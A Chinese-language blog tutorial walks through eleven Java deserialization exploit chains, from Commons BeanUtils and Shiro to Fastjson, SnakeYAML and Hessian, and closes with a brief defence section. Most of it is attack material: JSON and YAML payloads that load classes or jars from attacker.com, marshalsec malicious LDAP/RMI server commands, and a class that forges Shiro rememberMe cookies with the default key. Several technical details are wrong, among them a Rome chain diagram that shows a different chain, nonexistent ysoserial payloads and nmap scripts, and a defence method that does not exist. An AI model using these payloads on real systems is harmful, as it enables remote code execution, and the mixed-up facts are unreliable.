---
title: "Java反序列化漏洞全攻略：11条经典利用链详解"
date: 2026-06-15 11:00:00 +0800
author: Security Researcher
categories: [Web安全, Java安全]
tags: [Java反序列化, CB链, Shiro, RMI, JNDI, Fastjson, Jackson, Rome, 二次反序列化, JDBC, Hessian, SnakeYAML]
description: 新手友好的Java反序列化进阶教程。涵盖CB链、Shiro、RMI、JNDI、Fastjson、Jackson、Rome、二次反序列化、JDBC、Hessian、SnakeYAML等11条经典利用链。每条链都有原理讲解、调用流程图和Payload示例。
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。未经授权对他人系统进行渗透测试属于违法行为。

---

## 前言

本教程是Java反序列化系列的进阶篇。如果你还不了解Java序列化基础和CC链，建议先阅读 [Java反序列化入门：从DNSLog验证到CC链利用](/posts/java-deserialization-guide/) 。

本文将详细讲解以下11条经典利用链：

| # | 利用链 | 核心库 | 难度 |
|---|--------|--------|------|
| 1 | CB链 | Commons BeanUtils | ⭐⭐ |
| 2 | Shiro反序列化 | Apache Shiro | ⭐⭐ |
| 3 | RMI反序列化 | JDK RMI | ⭐⭐⭐ |
| 4 | JNDI注入 | JDK | ⭐⭐ |
| 5 | Fastjson反序列化 | Fastjson | ⭐⭐⭐ |
| 6 | Jackson反序列化 | Jackson | ⭐⭐ |
| 7 | Rome反序列化 | Rome | ⭐⭐⭐ |
| 8 | 二次反序列化 | 多库组合 | ⭐⭐⭐⭐ |
| 9 | JDBC反序列化 | MySQL Driver | ⭐⭐⭐ |
| 10 | Hessian反序列化 | Hessian | ⭐⭐⭐ |
| 11 | SnakeYAML反序列化 | SnakeYAML | ⭐⭐ |

---

## 第一章：CB链（Commons BeanUtils）

### 1.1 什么是Commons BeanUtils？

Commons BeanUtils是Apache的一个工具库，提供了对Java Bean的便捷操作（如属性访问、拷贝等）。它常与Commons Collections一起使用。

### 1.2 CB链原理

CB链的核心思路：
```
readObject() → HashMap.readObject() → BeanComparator.compare()
→ PropertyUtils.getProperty() → 反射调用getter方法
→ TemplatesImpl.newTransformer() → 任意代码执行
```

### 1.3 关键类详解

**BeanComparator**：
```java
public class BeanComparator implements Comparator, Serializable {
    private String property;
    private Comparator comparator;
    
    public int compare(Object o1, Object o2) {
        // 获取对象的属性值进行比较
        String value1 = PropertyUtils.getProperty(o1, property);
        String value2 = PropertyUtils.getProperty(o2, property);
        return comparator.compare(value1, value2);
    }
}
```

**TemplatesImpl**：
```java
// javax.xml.transform.Templates是一个接口
// TemplatesImpl是其实现类，包含恶意字节码
TemplatesImpl templates = new TemplatesImpl();
// 通过反射设置_bytecodes字段，包含恶意类的字节码
```

### 1.4 Payload生成

```bash
# 使用ysoserial生成CB链Payload
java -jar ysoserial.jar CommonsBeanutils1 "calc" > cb1.bin
```

### 1.5 手动构造Payload

```java
import org.apache.commons.beanutils.BeanComparator;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CB1Payload {
    public static void main(String[] args) throws Exception {
        // 1. 创建TemplatesImpl对象（包含恶意字节码）
        TemplatesImpl templates = new TemplatesImpl();
        Class<?> templatesClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        // 这里需要填入恶意类的字节码
        // bytecodesField.set(templates, new byte[][]{恶意字节码});
        
        // 2. 创建BeanComparator
        BeanComparator comparator = new BeanComparator(null, 
            java.util.Collections.reverseOrder());
        
        // 3. 创建PriorityQueue作为触发入口
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(templates);
        queue.add(templates);
        
        // 4. 序列化Payload
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.close();
        
        System.out.println("Payload length: " + baos.toByteArray().length);
    }
}
```

### 1.6 CB链 vs CC链

| 特性 | CC链 | CB链 |
|------|------|------|
| 依赖库 | Commons Collections | Commons BeanUtils |
| 执行命令方式 | Runtime.exec() | TemplatesImpl字节码执行 |
| 适用场景 | 有CC库 | 无CC库，但有BeanUtils |

---

## 第二章：Shiro反序列化

### 2.1 什么是Apache Shiro？

Apache Shiro是一个Java安全框架，提供了认证、授权、加密等功能。它使用`rememberMe` Cookie来实现"记住我"功能。

### 2.2 漏洞原理

Shiro的`rememberMe`功能流程：

```
1. 用户登录时，勾选"记住我"
2. Shiro将用户信息序列化 → AES加密 → Base64编码 → 放入Cookie
3. 下次访问时，Shiro从Cookie取出 → Base64解码 → AES解密 → 反序列化
```

**漏洞点**：AES密钥是硬编码的，默认密钥为`kPH+bIxk5D2deZiIxcaaaA==`

### 2.3 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│                    Shiro反序列化攻击流程                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 收集Shiro密钥（硬编码或爆破）                              │
│       ↓                                                     │
│  2. 使用密钥AES加密恶意序列化数据                               │
│       ↓                                                     │
│  3. Base64编码后放入rememberMe Cookie                        │
│       ↓                                                     │
│  4. Shiro服务端解密并反序列化                                  │
│       ↓                                                     │
│  5. 触发Gadget Chain执行命令                                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 2.4 常见密钥

以下是一些常见框架/中间件的Shiro密钥：

| 框架/应用 | 默认密钥 |
|-----------|----------|
| Shiro默认 | `kPH+bIxk5D2deZiIxcaaaA==` |
| Spring Boot | `AvMBMqFv1q7LkUxsTfK2rwiwt3B4lDP4` |
| ThinkPHP | `2AvVhdsgUs0FSA3SDFAdag==` |

### 2.5 Payload生成

```bash
# 使用shiro-exploit工具
python3 shiro_exploit.py -t rememberMe -k "kPH+bIxk5D2deZiIxcaaaA==" -p CommonsCollections6 -c "calc"
```

### 2.6 手动构造Payload

```java
import org.apache.shiro.crypto.AesCipher;
import javax.crypto.Cipher;
import java.io.*;
import java.util.Base64;

public class ShiroPayload {
    // Shiro默认密钥（需要Base64解码）
    private static final String DEFAULT_KEY = "kPH+bIxk5D2deZiIxcaaaA==";
    
    public static String generatePayload(String command) throws Exception {
        // 1. 生成CC链Payload
        byte[] payload = generateCCLink(command);
        
        // 2. AES加密
        byte[] key = Base64.getDecoder().decode(DEFAULT_KEY);
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] encrypted = cipher.doFinal(payload);
        
        // 3. Base64编码
        return Base64.getEncoder().encodeToString(encrypted);
    }
    
    public static void main(String[] args) throws Exception {
        String rememberMe = generatePayload("calc");
        System.out.println("rememberMe Cookie: " + rememberMe);
    }
}
```

### 2.7 漏洞检测

```bash
# 使用nmap检测Shiro
nmap -p 8080 --script http-shiro -script-args auth=admin:admin,secret=rememberMe http://target

# 使用curl检测
curl -v "http://target/login" --data "username=admin&password=123456&rememberMe=deleteMe"
# 如果返回Set-Cookie: rememberMe=deleteMe，说明存在Shiro
```

---

## 第三章：RMI反序列化

### 3.1 什么是RMI？

RMI（Remote Method Invocation）是Java的远程方法调用协议，允许一个JVM中的对象调用另一个JVM中对象的方法。

### 3.2 RMI架构

```
┌─────────────────────────────────────────────────────────────┐
│                       RMI架构                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Client（客户端）                                            │
│       ↓                                                     │
│  Registry（注册中心）← 存储远程对象引用                        │
│       ↓                                                     │
│  Server（服务端）← 实现远程接口                                │
│                                                             │
│  通信过程：                                                   │
│  1. Server将远程对象注册到Registry                            │
│  2. Client从Registry获取远程对象引用                           │
│  3. Client通过引用调用远程方法                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 3.3 漏洞原理

RMI通信中，客户端发送的序列化数据会被服务端反序列化。如果攻击者能控制序列化数据，就能触发反序列化漏洞。

**关键点**：
- RMI默认使用1099端口（Registry端口）
- RMI通信使用Java序列化协议
- Registry的lookup、bind、unbind等方法都可能触发反序列化

### 3.4 攻击场景

```java
// 服务端代码（存在漏洞）
public class VulnerableServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定远程对象时，会反序列化客户端数据
        registry.bind("test", new RemoteImpl());
    }
}
```

### 3.5 Payload生成

```bash
# 使用ysoserial生成RMI Payload
java -jar ysoserial.jar RMIRegistryExploit "target-ip:1099" "calc"
```

### 3.6 检测方法

```bash
# 检测RMI服务是否开放
nmap -p 1099 --script java-rmi target-ip

# 使用nmap检测RMI反序列化漏洞
nmap -p 1099 --script java-vuln-all target-ip
```

---

## 第四章：JNDI注入

### 4.1 什么是JNDI？

JNDI（Java Naming and Directory Interface）是Java的命名目录接口，提供了统一的API来访问各种命名和目录服务。

### 4.2 JNDI支持的协议

| 协议 | 说明 | 端口 |
|------|------|------|
| `rmi://` | Java远程方法调用 | 1099 |
| `ldap://` | 轻量级目录访问协议 | 389 |
| `dns://` | DNS查询 | 53 |
| `iiop://` | CORBA协议 | 5353 |
| `nds://` | NetWare目录服务 | - |

### 4.3 漏洞原理

JNDI注入的核心：

```
1. 攻击者控制JNDI查询的URL（如ldap://attacker.com/evil）
2. 目标服务器执行JNDI查询
3. 从攻击者服务器加载并实例化恶意类
4. 恶意类的构造代码块或静态代码块执行
```

### 4.4 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│                      JNDI注入攻击流程                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  攻击者：                                                    │
│  1. 在攻击者服务器部署恶意类                                   │
│  2. 启动LDAP/RMI服务器                                       │
│  3. 向目标发送恶意JNDI URL                                   │
│       ↓                                                     │
│  目标服务器：                                                 │
│  4. 执行JNDI查询（如 ctx.lookup("ldap://attacker.com/evil")） │
│  5. 连接到攻击者服务器                                        │
│  6. 下载并实例化恶意类                                        │
│  7. 恶意代码执行                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 4.5 恶意类示例

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

// 恶意类（需要实现ObjectFactory接口）
public class Evil implements ObjectFactory {
    static {
        // 静态代码块，类加载时执行
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, 
                                     Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

### 4.6 使用marshalsec搭建恶意LDAP

```bash
# 下载marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests

# 启动恶意LDAP服务器
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8080/#Evil" 1389
```

### 4.7 JNDI利用工具

```bash
# 使用JNDIExploit
java -jar JNDIExploit.jar -i attacker-ip

# 使用marshalsec
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Evil" 1389
```

---

## 第五章：Fastjson反序列化

### 5.1 什么是Fastjson？

Fastjson是阿里巴巴开源的高性能JSON库，广泛应用于Java项目中。

### 5.2 漏洞原理

Fastjson解析JSON时，会根据JSON中的`@type`字段自动实例化对应的Java类：

```json
{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://attacker.com/evil", "autoCommit": true}
```

**漏洞点**：`@type`字段可以指定任意类，如果目标类存在危险方法，就会被自动调用。

### 5.3 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│                    Fastjson攻击流程                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者构造恶意JSON，包含@type指定的类                      │
│       ↓                                                     │
│  2. 目标服务器使用Fastjson解析JSON                            │
│       ↓                                                     │
│  3. Fastjson根据@type实例化指定类                            │
│       ↓                                                     │
│  4. 自动调用类的setter方法                                    │
│       ↓                                                     │
│  5. 触发JNDI注入或命令执行                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 5.4 经典利用类

| 利用类 | 版本 | 说明 |
|--------|------|------|
| `JdbcRowSetImpl` | 1.2.24以下 | JNDI注入 |
| `TemplatesImpl` | 1.2.25以下 | 字节码执行 |
| `HashMap` | 需配合其他类 | 链式调用 |

### 5.5 Payload示例

**JNDI注入Payload**：
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
}
```

**字节码执行Payload**（1.2.25以下）：
```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": "恶意类字节码的Base64",
    "_name": "test",
    "_tfactory": {}
}
```

### 5.6 漏洞检测

```bash
# 使用Fastjson专用扫描器
python3 fastjson_scan.py -t http://target/api/json

# 使用nmap检测
nmap -p 8080 --script http-fastjson-detect target
```

### 5.7 利用工具

```bash
# 使用fastjson-exploit
java -jar fastjson-exploit.jar -t http://target/api -c "ldap://attacker.com:1389/Exploit"

# 使用ysoserial
java -jar ysoserial.jar Fastjson "ldap://attacker.com:1389/Exploit"
```

---

## 第六章：Jackson反序列化

### 6.1 什么是Jackson？

Jackson是另一个流行的Java JSON库，被Spring Boot等框架默认使用。

### 6.2 漏洞原理

Jackson在反序列化时，会调用目标类的getter/setter方法。如果目标类存在可利用的getter/setter，就能触发漏洞。

**关键点**：
- Jackson使用`@JsonTypeInfo`注解处理多态
- 可以通过`@class`字段指定要实例化的类

### 6.3 Payload示例

**JNDI注入Payload**：
```json
{
    "@class": "javax.naming.InitialContext",
    "ldap://attacker.com:1389/Exploit": {}
}
```

**TemplatesImpl字节码执行**：
```json
{
    "@class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": "恶意类字节码的Base64",
    "_name": "test"
}
```

### 6.4 漏洞检测

```bash
# 检测Jackson版本
# 查看pom.xml中的依赖版本

# 使用扫描器
python3 jackson_scan.py -t http://target/api
```

---

## 第七章：Rome反序列化

### 7.1 什么是Rome？

Rome是Java的一个RSS/Atom处理库，提供了JAXB注解支持。它被很多Java项目用作XML处理工具。

### 7.2 漏洞原理

Rome的核心类`ObjectBean`和`CollectionBean`在反序列化时会调用`equals()`方法，而`equals()`方法会触发JAXB的`toString()`，最终可以执行任意代码。

### 7.3 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│                      Rome链调用流程                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  HashMap.readObject()                                       │
│       ↓                                                     │
│  HashMap.hash() → TiedMapEntry.hashCode()                   │
│       ↓                                                     │
│  LazyMap.get() → ChainedTransformer.transform()             │
│       ↓                                                     │
│  ConstantTransformer → Runtime.class                         │
│       ↓                                                     │
│  InvokerTransformer → exec("命令")                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 7.4 Payload生成

```bash
# 使用ysoserial生成Rome链Payload
java -jar ysoserial.jar Rome "calc" > rome.bin
```

### 7.5 手动构造Payload

```java
import com.sun.syndication.feed.impl.ObjectBean;
import java.io.*;

public class RomePayload {
    public static void main(String[] args) throws Exception {
        // 1. 创建恶意ObjectBean
        // 需要配合TemplatesImpl使用
        
        // 2. 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        // oos.writeObject(maliciousObject);
        oos.close();
        
        System.out.println("Payload length: " + baos.toByteArray().length);
    }
}
```

---

## 第八章：二次反序列化

### 8.1 什么是二次反序列化？

二次反序列化是指数据被反序列化**两次**。第一次反序列化后得到的对象，会在后续操作中被再次序列化和反序列化。

### 8.2 为什么需要二次反序列化？

**目的**：绕过黑名单限制

```
第一次反序列化：只能使用白名单内的类
第二次反序列化：可以使用任意类（因为第一次反序列化已经绕过了检查）
```

### 8.3 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│                    二次反序列化攻击流程                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者发送恶意序列化数据                                   │
│       ↓                                                     │
│  2. 目标服务端第一次反序列化（有白名单检查）                     │
│       ↓                                                     │
│  3. 反序列化后得到一个"合法"对象                               │
│       ↓                                                     │
│  4. 服务端对这个对象再次序列化                                  │
│       ↓                                                     │
│  5. 第二次反序列化（无白名单检查）                              │
│       ↓                                                     │
│  6. 触发恶意Gadget Chain                                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 8.4 典型案例：WebLogic T3协议

WebLogic的T3协议就存在二次反序列化漏洞：

```java
// WebLogic T3协议处理流程
// 1. 接收客户端数据
// 2. 第一次反序列化（有Filter检查）
// 3. 将对象传给内部处理逻辑
// 4. 内部逻辑再次序列化/反序列化（无Filter检查）
// 5. 触发恶意代码
```

### 8.5 利用方式

```bash
# 使用ysoserial生成二次反序列化Payload
java -jar ysoserial.jar JRMPClient "attacker-ip:1099"
```

---

## 第九章：JDBC反序列化

### 9.1 什么是JDBC？

JDBC（Java Database Connectivity）是Java访问数据库的标准接口。不同数据库有不同的驱动实现。

### 9.2 漏洞原理

JDBC驱动在连接数据库时，会解析连接字符串（URL）。某些驱动支持在URL中指定`autoDeserialize`参数，会自动反序列化数据库返回的数据。

**关键点**：
- MySQL驱动支持`autoDeserialize=true`
- 攻击者可以搭建恶意MySQL服务器
- 当目标连接恶意服务器时，服务器返回恶意序列化数据

### 9.3 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│                    JDBC反序列化攻击流程                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者搭建恶意MySQL服务器                                 │
│       ↓                                                     │
│  2. 目标应用配置连接恶意MySQL                                  │
│       ↓                                                     │
│  3. 目标连接恶意MySQL，发送查询                                │
│       ↓                                                     │
│  4. 恶意MySQL返回恶意序列化数据                               │
│       ↓                                                     │
│  5. 目标驱动自动反序列化数据（autoDeserialize=true）            │
│       ↓                                                     │
│  6. 触发Gadget Chain                                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 9.4 连接字符串示例

```
jdbc:mysql://attacker.com:3306/test?autoDeserialize=true&user=yso
```

### 9.5 利用工具

```bash
# 使用mysql-fake-server
python3 mysql_fake_server.py --port 3306 --payload /path/to/payload.bin

# 使用ysoserial生成JDBC Payload
java -jar ysoserial.jar JdbcRowSetImpl "ldap://attacker.com:1389/Exploit"
```

---

## 第十章：Hessian反序列化

### 10.1 什么是Hessian？

Hessian是一个二进制Web服务协议，被很多Java RPC框架使用（如Dubbo、Alibaba Dubbo等）。它使用自己的序列化格式，比Java原生序列化更快。

### 10.2 漏洞原理

Hessian反序列化时，会根据类名实例化对象并调用其setter方法。如果目标类存在危险的setter，就能触发漏洞。

**与Java反序列化的区别**：
- Hessian有自己的序列化格式（不使用`AC ED`魔数）
- Hessian不依赖`readObject()`方法
- Hessian通过setter方法注入属性

### 10.3 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│                    Hessian反序列化攻击流程                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者构造恶意Hessian数据                                 │
│       ↓                                                     │
│  2. 目标服务端接收数据                                        │
│       ↓                                                     │
│  3. Hessian解析数据，根据类名实例化对象                        │
│       ↓                                                     │
│  4. 调用对象的setter方法注入属性                               │
│       ↓                                                     │
│  5. 触发危险操作（如JNDI注入）                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 10.4 常见利用类

| 类名 | 漏洞点 |
|------|--------|
| `com.sun.rowset.JdbcRowSetImpl` | JNDI注入 |
| `org.apache.xbean.propertyeditor.JndiConverter` | JNDI注入 |
| `com.alibaba.fastjson.JSONObject` | Fastjson链 |

### 10.5 Payload示例

```java
import com.caucho.hessian.io.Hessian2Output;
import javax.naming.InitialContext;
import java.io.*;

public class HessianPayload {
    public static void main(String[] args) throws Exception {
        // 1. 创建恶意对象
        // 使用TemplatesImpl进行字节码执行
        
        // 2. 使用Hessian序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output ho = new Hessian2Output(baos);
        // ho.writeObject(maliciousObject);
        ho.flush();
        
        System.out.println("Payload length: " + baos.toByteArray().length);
    }
}
```

---

## 第十一章：SnakeYAML反序列化

### 11.1 什么是SnakeYAML？

SnakeYAML是一个YAML解析库，被Spring Boot等框架用于解析`application.yml`配置文件。

### 11.2 漏洞原理

SnakeYAML解析YAML时，可以使用`!!`语法指定要实例化的Java类：

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [
    !!java.net.URL ["http://attacker.com/evil.jar"]
  ]
]
```

**漏洞点**：SnakeYAML会自动实例化指定的类，并调用其方法。

### 11.3 攻击流程

```
┌─────────────────────────────────────────────────────────────┐
│                   SnakeYAML攻击流程                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 攻击者构造恶意YAML文件                                    │
│       ↓                                                     │
│  2. 目标应用加载YAML配置                                      │
│       ↓                                                     │
│  3. SnakeYAML解析YAML，实例化指定类                           │
│       ↓                                                     │
│  4. 执行类的构造代码或静态代码块                               │
│       ↓                                                     │
│  5. 恶意代码执行                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 11.4 Payload示例

**ScriptEngineManager Payload**：
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [
    !!java.net.URL ["http://attacker.com/evil.jar"]
  ]
]
```

**JNDI注入 Payload**：
```yaml
!!com.sun.rowset.JdbcRowSetImpl
dataSourceName: "ldap://attacker.com:1389/Exploit"
autoCommit: true
```

### 11.5 利用工具

```bash
# 使用SnakeYAML Exploit
python3 snakeyaml_exploit.py -t http://target -p "ldap://attacker.com:1389/Exploit"

# 搭建恶意LDAP服务器
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Evil" 1389
```

---

## 第十二章：利用工具汇总

### 12.1 ysoserial（Java反序列化瑞士军刀）

```bash
# 下载
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package -DskipTests

# 常用命令
java -jar ysoserial.jar                          # 列出所有Payload
java -jar ysoserial.jar CommonsCollections6 "calc"  # 生成CC6链
java -jar ysoserial.jar JdbcRowSetImpl "dnslog.cn"  # DNSLog验证
java -jar ysoserial.jar JNDI "ldap://attacker.com"   # JNDI注入
```

### 12.2 marshalsec（JNDI利用）

```bash
# 下载
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec && mvn clean package -DskipTests

# 启动恶意LDAP
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://attacker.com/#Evil" 1389

# 启动恶意RMI
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.RMIRefServer "http://attacker.com/#Evil" 1099
```

### 12.3 其他工具

| 工具名 | 用途 |
|--------|------|
| JNDIExploit | JNDI综合利用工具 |
| shiro-exploit | Shiro漏洞利用 |
| fastjson-exploit | Fastjson漏洞利用 |
| phpGGC | PHP反序列化Payload生成 |

---

## 第十三章：防御措施

### 13.1 通用防御

```java
// 1. 禁用反序列化
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setValidatingClassLoader(new SafeClassLoader());

// 2. 使用白名单
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.SafeClass"
    );
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Not allowed: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

### 13.2 框架级防御

| 框架 | 防御方式 |
|------|----------|
| **Fastjson** | 开启`autoType`安全模式，使用`safeMode` |
| **Jackson** | 配置`DefaultTyping`安全策略 |
| **Shiro** | 升级版本，使用安全密钥 |
| **WebLogic** | 安装官方补丁，限制T3协议 |

### 13.3 运维防御

1. **及时更新**：保持依赖库和框架版本最新
2. **网络隔离**：限制服务器出网能力
3. **日志监控**：监控异常序列化数据
4. **WAF规则**：部署针对序列化漏洞的检测规则

---

## 参考资源

- [ysoserial - Java反序列化利用工具](https://github.com/frohoff/ysoserial)
- [marshalsec - Java反序列化研究](https://github.com/mbechler/marshalsec)
- [Apache Commons BeanUtils](https://commons.apache.org/proper/commons-beanutils/)
- [Apache Shiro](https://shiro.apache.org/)
- [Fastjson](https://github.com/alibaba/fastjson)
- [Jackson](https://github.com/FasterXML/jackson)
- [SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

## 总结

| 利用链 | 核心原理 | 适用场景 |
|--------|----------|----------|
| **CB链** | BeanComparator + TemplatesImpl | 有BeanUtils库 |
| **Shiro** | AES硬编码密钥 + rememberMe | Shiro认证系统 |
| **RMI** | 远程方法调用反序列化 | RMI服务 |
| **JNDI** | LDAP/RMI远程类加载 | 任何JNDI调用点 |
| **Fastjson** | @type自动实例化 | Fastjson解析点 |
| **Jackson** | @class多态反序列化 | Jackson解析点 |
| **Rome** | JAXB注解 + equals触发 | RSS/Atom处理 |
| **二次反序列化** | 绕过白名单限制 | 有反序列化过滤器 |
| **JDBC** | autoDeserialize参数 | 数据库连接 |
| **Hessian** | 二进制RPC协议 | Dubbo等RPC框架 |
| **SnakeYAML** | !!语法实例化类 | YAML配置解析 |

**核心教训**：Java反序列化漏洞的本质是**信任了不可信的数据**。防御的核心思路是：
1. **不要反序列化不可信数据**
2. **使用白名单限制可反序列化的类**
3. **及时更新依赖库版本**

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年6月15日*
